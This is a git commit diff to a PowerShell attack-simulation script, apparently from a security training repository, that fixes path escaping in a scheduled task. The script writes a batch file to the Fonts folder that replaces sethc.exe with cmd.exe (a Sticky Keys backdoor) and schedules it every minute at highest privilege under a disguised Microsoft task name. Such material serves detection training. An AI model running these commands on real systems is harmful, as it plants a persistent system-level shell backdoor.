f8bba4afbb21f9736d7f993531cad809e92e5b63
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-03-25 10:47:39 -0600

    Fix schtasks

--- endpoint_attacks/scheduled_tasks/ttp.ps1
+++ endpoint_attacks/scheduled_tasks/ttp.ps1
@@ -10,4 +10,4 @@ auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure
 <# Attack #>
 echo "move c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe" >> c:\\Windows\\Fonts\\pepper.cmd
 
-SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\\Windows\\WCM\\Nettask /TR c:\\Windows\\Fonts\\pepper.cmd /RL HIGHEST
+SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\Windows\WCM\Nettask /TR C:\Windows\Fonts\pepper.cmd /RL HIGHEST
